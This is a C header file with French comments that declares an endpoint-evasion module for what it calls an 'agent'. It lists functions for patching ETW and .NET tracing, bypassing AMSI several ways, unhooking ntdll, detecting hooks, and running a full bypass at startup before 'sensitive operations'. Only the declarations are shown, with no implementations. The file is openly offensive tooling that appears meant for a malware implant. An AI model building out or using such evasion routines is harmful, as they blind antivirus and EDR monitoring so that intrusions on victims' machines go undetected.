/*
 * edr_evasion.h - Techniques de contournement EDR/AV
 *
 * Techniques:
 * - ETW Patching (désactive Event Tracing)
 * - AMSI Bypass (désactive Antimalware Scan Interface)
 * - Unhooking ntdll (restaure les fonctions hookées)
 *
 * À appeler au démarrage de l'agent avant toute opération sensible
 */

#ifndef EDR_EVASION_H
#define EDR_EVASION_H

#include <windows.h>

/* =========================================================================
 * ETW Patching
 * ========================================================================= */

/* Patch EtwEventWrite pour désactiver ETW */
BOOL Evasion_PatchETW(void);

/* Patch NtTraceEvent (niveau plus bas) */
BOOL Evasion_PatchNtTraceEvent(void);

/* Désactive complètement ETW */
BOOL Evasion_DisableETW(void);

/* =========================================================================
 * AMSI Bypass
 * ========================================================================= */

/* Patch AmsiScanBuffer */
BOOL Evasion_PatchAMSI(void);

/* Patch AmsiOpenSession */
BOOL Evasion_PatchAmsiOpenSession(void);

/* Bypass via amsiInitFailed (plus discret) */
BOOL Evasion_AmsiInitFailedBypass(void);

/* Désactive complètement AMSI */
BOOL Evasion_DisableAMSI(void);

/* =========================================================================
 * Unhooking NTDLL
 * ========================================================================= */

/* Unhook ntdll complet (remappe .text depuis le disque) */
BOOL Evasion_UnhookNtdll(void);

/* Unhook une fonction spécifique */
BOOL Evasion_UnhookFunction(const char* functionName);

/* Unhook les fonctions sensibles couramment hookées */
BOOL Evasion_UnhookSensitiveFunctions(void);

/* =========================================================================
 * Détection de hooks
 * ========================================================================= */

/* Vérifie si une fonction est hookée */
BOOL Evasion_IsFunctionHooked(const char* functionName);

/* Liste les fonctions hookées en JSON */
BOOL Evasion_ListHookedFunctions(char** outJson);

/* =========================================================================
 * CLR ETW
 * ========================================================================= */

/* Désactive le tracing .NET/CLR */
BOOL Evasion_DisableCLRETW(void);

/* =========================================================================
 * API Principale
 * ========================================================================= */

/* Applique toutes les techniques d'évasion */
BOOL Evasion_FullBypass(void);

/* Retourne l'état des protections */
BOOL Evasion_GetStatus(char** outJson);

#endif /* EDR_EVASION_H */
